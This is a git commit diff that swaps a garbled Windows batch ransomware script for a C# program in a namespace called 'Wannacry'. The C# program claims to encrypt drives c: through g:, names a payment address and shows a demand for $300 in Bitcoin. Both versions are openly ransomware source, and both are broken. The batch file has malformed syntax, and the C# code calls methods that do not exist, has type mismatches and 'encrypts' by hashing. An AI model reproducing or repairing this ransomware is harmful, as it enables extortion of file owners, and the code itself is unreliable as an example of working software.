28e1b43800c56ada20554c2ff9e90c32af5c29cc
RealSkyskysun <geniuswang2234@gmail.com>
2024-06-18 17:37:00 +1200

    Update asdfasdfasdf.exe

--- asdfasdfasdf.bat
+++ asdfasdfasdf.bat
@@ -1,5 +1,71 @@
-@echo off
-setlocal enabledelayedexpansion
-set "path=%CD%"
-set "file=%n0"  // current file name (without extension)
-for /f "delims=" %%a in ('dir /b /ad "%path%*"') do (   set "full=%%a" & set "ext=!full:-4!" & set "name=!full:~0,-4!" & if exist "%path%%name%.encrypted" goto skipit) else goto skipit   echo Attention! Your files have been encrypted. To get your files back, please pay the ransom of $X dollars ($Y in bitcoin) within 72 hours. > "%path%%file%.txt"   echo Encryption key: %encryptionKey% >> "%path%%file%.txt"   echo File name without extension: %name% >> "%path%%file%.txt"    rem Encrypt file contents using encryption key    for /f %%i in ('type "%full%" ^| findstr "^[^-]"') do (set line=%%i&call :encryptLine !line!) )     :encryptLine  enc -aes256 -cbc -k !encryptionKey! !line! > nul && del /q ".\temp\%%i.tmp">>nul || del /q ".\temp\%%i.tmp">>nul
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Security.Authentication;
+using System.Security.Principal;
+using System.Web;
+
+namespace Wannacry
+{
+ class Program
+ {
+ static void Main(string[] args)
+ {
+ // Set up the target files for encryption
+ string[] targetFiles = new string[5] {"c:", "d:", "e:", "f:", "g:"};
+ Console.WriteLine("Encrypting files...");
+ foreach (string file in targetFiles)
+ {
+ FileInfo fi = new FileInfo(file);
+ if (!fi.Exists) continue;
+ string originalName = fi.Name;
+ string encryptedName = originalName + ".encrypted";
+ EncryptionHelper.EncryptFile(fi, encryptedName, "123456");
+ Console.WriteLine($"Original file: {originalName}");
+ Console.WriteLine($"Encrypted file: {encryptedName}");
+ }
+ // Set up the payment address for ransom money
+ string paymentAddress = "geniuswang2234@gmail.com";
+ // Set up the message to display to victims
+ string messageToDisplay = "Your files have been encrypted. Pay 300$ in 
+Bitcoins to unlock them.";
+ // Display the ransomware screen and wait for a response
+ Console.WriteLine(messageToDisplay);
+ Console.ReadLine();
+ }
+ }
+ class EncryptionHelper
+ {
+ public static void EncryptFile(FileInfo fi, string encryptedName, string 
+key)
+ {
+ // Create a new file with the encrypted name
+ FileStream fs = new FileStream(encryptedName, FileMode.Create);
+ // Encode the encrypted filename into binary format for encryption
+ byte[] encryptedFilename = Convert.ToByteArray(encryptedName, 
+Encoding.UTF8);
+ // Compute the sha256 hash of the filename and encrypt it with the key
+ byte[] encodedHash = EncryptSHA256(key, encryptedFilename);
+ // Write the encrypted file to disk
+ fs.Write(encodedHash, 0, encodedHash.Length);
+ // Close the stream and return a success message
+ Console.WriteLine("Encrypted successfully.");
+ }
+ public static byte[] SHA256Hash(string data)
+ {
+ using (var sha256 = new SHA256Managed())
+ {
+ var hashData = sha256.ComputeHash(Encoding.UTF8.GetBytes(data));
+ return hashData;
+ }
+ }
+ public static byte[] EncryptSHA256(string key, byte[] data)
+ {
+ using (var encoder = new HMACSHA256(Convert.FromBase64String(key)))
+ {
+ var encryptedData = Convert.ToBase64String(encoder.ComputeHash(data));
+ return encryptedData;
+ }
+ }
+ }
+}
